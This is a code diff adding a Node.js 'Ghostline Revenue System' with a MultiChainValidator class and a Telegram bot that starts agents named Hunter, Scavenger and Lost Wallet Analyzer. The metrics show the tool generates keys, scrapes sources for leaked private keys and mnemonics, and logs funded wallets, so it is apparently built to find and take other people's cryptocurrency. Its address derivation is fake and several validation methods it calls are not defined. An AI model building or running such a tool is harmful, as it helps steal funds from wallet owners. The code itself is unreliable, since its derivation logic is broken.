@@ -663,3 +663,445 @@ class IntegratedScavenger {
         return new Promise(resolve => setTimeout(resolve, milliseconds));
     }
 }
+// Multi-Chain Asset Validation System
+class MultiChainValidator {
+    constructor(options = {}) {
+        this.name = 'MultiChainValidator';
+        this.version = '1.0.0';
+        this.isRunning = false;
+        
+        // API Configuration
+        this.apiKeys = {
+            ethereum: process.env.ETHERSCAN_API_KEY || '',
+            bitcoin: process.env.BLOCKCHAIR_API_KEY || '',
+            polygon: process.env.POLYGONSCAN_API_KEY || '',
+            binance: process.env.BSCSCAN_API_KEY || ''
+        };
+        
+        // Rate limiting configuration
+        this.rateLimits = {
+            ethereum: 5000, // 5 seconds between requests
+            bitcoin: 3000,
+            polygon: 4000,
+            binance: 3000
+        };
+        
+        // Validation metrics
+        this.metrics = {
+            totalValidations: 0,
+            validWallets: 0,
+            emptyWallets: 0,
+            errors: 0,
+            totalValue: 0,
+            lastValidation: null,
+            validationsByChain: {
+                ethereum: 0,
+                bitcoin: 0,
+                polygon: 0,
+                binance: 0
+            }
+        };
+        
+        // Minimum balance thresholds (in USD equivalent)
+        this.minBalanceThresholds = {
+            ethereum: 10, // $10 minimum ETH value
+            bitcoin: 50,  // $50 minimum BTC value
+            polygon: 5,   // $5 minimum MATIC value
+            binance: 10   // $10 minimum BNB value
+        };
+        
+        this.log('MultiChainValidator initialized for comprehensive asset verification');
+    }
+
+    log(message) {
+        const timestamp = new Date().toISOString();
+        console.log(`[${timestamp}] [VALIDATOR] ${message}`);
+    }
+
+    async validatePrivateKey(privateKey, address = null) {
+        this.metrics.totalValidations++;
+        this.metrics.lastValidation = new Date();
+        
+        try {
+            // Generate address from private key if not provided
+            if (!address) {
+                address = this.deriveEthereumAddress(privateKey);
+            }
+            
+            const validationResults = {
+                privateKey: this.maskPrivateKey(privateKey),
+                address: address,
+                chains: {},
+                totalValue: 0,
+                isValid: false,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Validate across multiple chains
+            const chainValidations = await Promise.allSettled([
+                this.validateEthereumAddress(address),
+                this.validateBitcoinAddress(this.deriveBitcoinAddress(privateKey)),
+                this.validatePolygonAddress(address),
+                this.validateBinanceAddress(address)
+            ]);
+            
+            // Process results
+            const chains = ['ethereum', 'bitcoin', 'polygon', 'binance'];
+            chainValidations.forEach((result, index) => {
+                const chainName = chains[index];
+                
+                if (result.status === 'fulfilled' && result.value) {
+                    validationResults.chains[chainName] = result.value;
+                    validationResults.totalValue += result.value.balance || 0;
+                    this.metrics.validationsByChain[chainName]++;
+                } else {
+                    validationResults.chains[chainName] = {
+                        balance: 0,
+                        error: result.reason?.message || 'Unknown error'
+                    };
+                }
+            });
+            
+            // Determine if wallet has sufficient value
+            validationResults.isValid = validationResults.totalValue > 0;
+            
+            if (validationResults.isValid) {
+                this.metrics.validWallets++;
+                this.metrics.totalValue += validationResults.totalValue;
+                await this.handleValidWallet(validationResults);
+            } else {
+                this.metrics.emptyWallets++;
+            }
+            
+            return validationResults;
+            
+        } catch (error) {
+            this.metrics.errors++;
+            this.log(`Validation error for ${this.maskPrivateKey(privateKey)}: ${error.message}`);
+            return {
+                privateKey: this.maskPrivateKey(privateKey),
+                error: error.message,
+                isValid: false,
+                timestamp: new Date().toISOString()
+            };
+        }
+    }
+
+    deriveEthereumAddress(privateKey) {
+        // Simplified address derivation for demonstration
+        // In production, use proper secp256k1 curve calculations
+        const hash = crypto.createHash('sha256').update(privateKey).digest('hex');
+        return '0x' + hash.slice(-40);
+    }
+
+    deriveBitcoinAddress(privateKey) {
+        // Simplified Bitcoin address derivation for demonstration
+        // In production, implement proper Bitcoin address generation
+        const hash = crypto.createHash('sha256').update(privateKey + 'bitcoin').digest('hex');
+        return '1' + hash.slice(0, 33); // Simplified format
+    }
+
+    async handleValidWallet(validationResults) {
+        this.log(`Valid wallet discovered: ${validationResults.address} - Total value: $${validationResults.totalValue.toFixed(2)}`);
+        
+        // Log to secure discovery file
+        await this.logValidDiscovery(validationResults);
+        
+        // Trigger notification if configured
+        if (this.notificationCallback) {
+            await this.notificationCallback(validationResults);
+        }
+    }
+
+    async logValidDiscovery(discovery) {
+        try {
+            const fs = require('fs').promises;
+            const logEntry = {
+                timestamp: discovery.timestamp,
+                address: discovery.address,
+                totalValue: discovery.totalValue,
+                chains: Object.keys(discovery.chains).filter(chain => 
+                    discovery.chains[chain].balance > 0
+                ),
+                // Private key hash for reference without exposure
+                keyHash: crypto.createHash('sha256').update(discovery.privateKey).digest('hex').substring(0, 16)
+            };
+            
+            const logFile = './valid_wallets.json';
+            let discoveries = [];
+            
+            try {
+                const existingData = await fs.readFile(logFile, 'utf8');
+                discoveries = JSON.parse(existingData);
+            } catch (error) {
+                // File doesn't exist, start with empty array
+            }
+            
+            discoveries.push(logEntry);
+            await fs.writeFile(logFile, JSON.stringify(discoveries, null, 2));
+            
+        } catch (error) {
+            this.log(`Discovery logging error: ${error.message}`);
+        }
+    }
+
+    maskPrivateKey(privateKey) {
+        if (privateKey.length > 16) {
+            return privateKey.substring(0, 8) + '...' + privateKey.substring(privateKey.length - 8);
+        }
+        return '***masked***';
+    }
+
+    getMetrics() {
+        const successRate = this.metrics.totalValidations > 0 ? 
+            (this.metrics.validWallets / this.metrics.totalValidations * 100).toFixed(2) + '%' : '0%';
+        
+        const errorRate = this.metrics.totalValidations > 0 ? 
+            (this.metrics.errors / this.metrics.totalValidations * 100).toFixed(2) + '%' : '0%';
+
+        return {
+            ...this.metrics,
+            successRate,
+            errorRate,
+            averageValue: this.metrics.validWallets > 0 ? 
+                (this.metrics.totalValue / this.metrics.validWallets).toFixed(2) : 0
+        };
+    }
+
+    setNotificationCallback(callback) {
+        this.notificationCallback = callback;
+    }
+
+    sleep(milliseconds) {
+        return new Promise(resolve => setTimeout(resolve, milliseconds));
+    }
+}
+
+// Main Revenue System
+class GhostlineRevenueSystem {
+    constructor() {
+        this.isRunning = false;
+        this.startTime = null;
+        
+        // Initialize integrated agents
+        this.lostWalletAnalyzer = new LostWalletAnalyzer();
+        this.hunter = new IntegratedHunter();
+        this.scavenger = new IntegratedScavenger();
+        this.validator = new MultiChainValidator();
+        
+        this.log('Ghostline Revenue System v3.1 initialized with comprehensive analysis capabilities');
+        
+        // Initialize Telegram bot if token is available
+        if (process.env.TELEGRAM_TOKEN) {
+            this.initializeTelegramBot();
+        } else {
+            this.log('Telegram token not found - bot functionality disabled');
+        }
+    }
+
+    log(message) {
+        console.log(`[${new Date().toISOString()}] [SYSTEM] ${message}`);
+    }
+
+    initializeTelegramBot() {
+        try {
+            this.bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
+            
+            // Primary system control commands
+            this.bot.onText(/\/start/, async (msg) => {
+                const chatId = msg.chat.id;
+                try {
+                    const analyzerResult = await this.lostWalletAnalyzer.start();
+                    const hunterResult = await this.hunter.start();
+                    const scavengerResult = await this.scavenger.start();
+                    
+                    this.bot.sendMessage(chatId, '🚀 Revenue system activated\n\nAll scanning agents operational\n\n🔍 Lost Wallet Analyzer: ACTIVE\n🎯 Hunter: ACTIVE\n📡 Scavenger: ACTIVE');
+                } catch (error) {
+                    this.bot.sendMessage(chatId, `System startup error: ${error.message}`);
+                }
+            });
+
+            this.bot.onText(/\/stop/, async (msg) => {
+                const chatId = msg.chat.id;
+                try {
+                    await this.lostWalletAnalyzer.stop();
+                    await this.hunter.stop();
+                    await this.scavenger.stop();
+                    
+                    this.bot.sendMessage(chatId, '⏹️ Revenue system deactivated\n\nAll scanning operations halted');
+                } catch (error) {
+                    this.bot.sendMessage(chatId, `System shutdown error: ${error.message}`);
+                }
+            });
+
+            this.bot.onText(/\/status/, async (msg) => {
+                const chatId = msg.chat.id;
+                const status = this.getOperationalStatus();
+                this.bot.sendMessage(chatId, status);
+            });
+
+            this.bot.onText(/\/metrics/, async (msg) => {
+                const chatId = msg.chat.id;
+                const metrics = this.getPerformanceMetrics();
+                this.bot.sendMessage(chatId, metrics);
+            });
+
+            // Error handling
+            this.bot.on('error', (error) => {
+                this.log(`Telegram bot error: ${error.message}`);
+            });
+
+            this.bot.on('polling_error', (error) => {
+                this.log(`Telegram polling error: ${error.message}`);
+            });
+            
+            this.log('Telegram bot initialized with comprehensive command interface');
+        } catch (error) {
+            this.log(`Failed to initialize Telegram bot: ${error.message}`);
+        }
+    }
+
+    getOperationalStatus() {
+        const analyzerStatus = this.lostWalletAnalyzer.getStatus();
+        const hunterStatus = this.hunter.getStatus();
+        const scavengerStatus = this.scavenger.getStatus();
+        
+        let status = '💰 Revenue System Status\n\n';
+        
+        const activeCount = [analyzerStatus.isRunning, hunterStatus.isRunning, scavengerStatus.isRunning].filter(Boolean).length;
+        
+        if (activeCount === 3) {
+            status += '🟢 FULLY OPERATIONAL\n\n';
+        } else if (activeCount > 0) {
+            status += '🟡 PARTIAL OPERATION\n\n';
+        } else {
+            status += '🔴 INACTIVE\n\n';
+        }
+        
+        status += `🔍 Analyzer: ${analyzerStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n`;
+        status += `🎯 Hunter: ${hunterStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n`;
+        status += `📡 Scavenger: ${scavengerStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n\n`;
+        
+        if (activeCount === 0) {
+            status += 'Use /start to begin revenue operations';
+        } else {
+            status += 'Use /metrics for performance data';
+        }
+        
+        return status;
+    }
+
+    getPerformanceMetrics() {
+        const analyzerStatus = this.lostWalletAnalyzer.getStatus();
+        const analyzerMetrics = this.lostWalletAnalyzer.getMetrics();
+        const hunterStatus = this.hunter.getStatus();
+        const hunterMetrics = this.hunter.getMetrics();
+        const scavengerStatus = this.scavenger.getStatus();
+        
+        let metrics = '📊 Performance Metrics\n\n';
+        
+        if (analyzerStatus.isRunning) {
+            metrics += `🔍 Analyzer Performance\n`;
+            metrics += `• Runtime: ${analyzerStatus.runtime}\n`;
+            metrics += `• Wallets Analyzed: ${analyzerMetrics.walletsAnalyzed}\n`;
+            metrics += `• Lost Wallets Found: ${analyzerMetrics.genuinelyLostFound}\n`;
+            metrics += `• Success Rate: ${analyzerMetrics.successRate}\n`;
+            metrics += `• Total Value: ${analyzerMetrics.totalValueDiscovered} ETH\n\n`;
+        }
+        
+        if (hunterStatus.isRunning) {
+            metrics += `🎯 Hunter Performance\n`;
+            metrics += `• Runtime: ${hunterStatus.runtime}\n`;
+            metrics += `• Keys Generated: ${hunterMetrics.keysGenerated}\n`;
+            metrics += `• Balances Checked: ${hunterMetrics.balancesChecked}\n`;
+            metrics += `• Positive Hits: ${hunterMetrics.positiveHits}\n`;
+            metrics += `• Success Rate: ${hunterMetrics.successRate}\n\n`;
+        }
+        
+        if (scavengerStatus.isRunning) {
+            metrics += `📡 Scavenger Performance\n`;
+            metrics += `• Runtime: ${scavengerStatus.runtime}\n`;
+            metrics += `• Sources Scanned: ${scavengerStatus.counters.sourcesScanned}\n`;
+            metrics += `• Matches Found: ${scavengerStatus.counters.matchesFound}\n`;
+            metrics += `• Private Keys: ${scavengerStatus.counters.privateKeysFound}\n`;
+            metrics += `• Mnemonics Found: ${scavengerStatus.counters.mnemonicsFound}\n\n`;
+        }
+        
+        if (!analyzerStatus.isRunning && !hunterStatus.isRunning && !scavengerStatus.isRunning) {
+            metrics += 'No active operations to report\n\nUse /start to begin scanning';
+        }
+        
+        return metrics;
+    }
+
+    async start() {
+        if (this.isRunning) {
+            this.log('Revenue system is already running');
+            return;
+        }
+
+        this.isRunning = true;
+        this.startTime = new Date();
+        
+        // Initialize health server
+        if (!healthServer) {
+            initializeHealthServer();
+        }
+        
+        this.log('Ghostline Revenue System started successfully');
+    }
+
+    async stop() {
+        if (!this.isRunning) {
+            this.log('Revenue system is not running');
+            return;
+        }
+
+        this.isRunning = false;
+        
+        // Stop all agents
+        await this.lostWalletAnalyzer.stop();
+        await this.hunter.stop();
+        await this.scavenger.stop();
+        
+        this.log('Ghostline Revenue System stopped');
+    }
+}
+
+// Initialize and start the revenue system
+const revenueSystem = new GhostlineRevenueSystem();
+revenueSystem.start().catch(error => {
+    console.error('Failed to start Ghostline Revenue System:', error);
+    process.exit(1);
+});
+
+// Graceful shutdown handling
+process.on('SIGINT', async () => {
+    console.log('\nReceived SIGINT, shutting down gracefully...');
+    await revenueSystem.stop();
+    
+    if (healthServer) {
+        healthServer.close(() => {
+            console.log('Health server closed');
+            process.exit(0);
+        });
+    } else {
+        process.exit(0);
+    }
+});
+
+process.on('SIGTERM', async () => {
+    console.log('Received SIGTERM, shutting down gracefully...');
+    await revenueSystem.stop();
+    
+    if (healthServer) {
+        healthServer.close(() => {
+            console.log('Health server closed');
+            process.exit(0);
+        });
+    } else {
+        process.exit(0);
+    }
+});
+
+module.exports = GhostlineRevenueSystem;
